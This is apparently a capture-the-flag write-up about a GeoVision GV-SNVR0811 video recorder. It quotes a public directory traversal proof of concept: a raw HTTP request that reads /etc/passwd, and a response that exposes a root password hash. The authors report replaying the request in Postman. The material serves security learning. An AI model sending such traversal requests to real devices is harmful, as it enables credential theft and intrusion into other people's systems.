---
title: GeoVision Flag
description: GeoVision GV-SNVR0811 Flag
tags:
  - known exploit
  - easy
categories:
  - SOHOplessly Broken
draft: false  # change to false when time to publish
---

Doing a search of GeoVision GV-SNVR0811 + exploit in Google netted us with a ton of results with the following exploit.

[https://www.exploit-db.com/exploits/45065](https://www.exploit-db.com/exploits/45065)


# Exploit

```txt
# Exploit Title: GeoVision GV-SNVR0811 Directory Traversal
# Exploit Author: Berk Dusunur
# Google Dork: N/A
# Type: Hardware
# Date: 2018-07-21
# Vendor Homepage: http://www.geovision.com.tw/product/GV-SNVR0811
# Software Link: http://www.geovision.com.tw/product/GV-SNVR0811
# Affected Version: N/A
# Tested on: Parrot OS
# CVE : N/A


# Proof Of Concept

GET Request

GET ../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0)
Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

Response

HTTP/1.1 200 OK
Server:Cross Web Server
Content-length: 59
Content-type: application/octet-stream

root:$1$$qRPK7m23GJusamGpoGLby/:0:0::/root:/bin/sh
```

## Using this exploit

We put this exploit into postman, with the header configuration. We ran the request, and got the root hash.
